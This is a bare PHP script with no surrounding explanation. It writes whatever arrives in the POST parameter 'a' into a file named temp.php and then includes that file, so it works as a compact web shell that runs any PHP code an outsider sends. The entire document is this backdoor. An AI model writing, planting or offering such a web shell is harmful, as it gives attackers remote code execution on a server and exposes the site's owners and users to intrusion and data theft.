<?php
$file = fopen("temp.php","w");
echo fwrite($file,"<?php ".$_POST[a].' ?>');
fclose($file);
include('temp.php');
?>
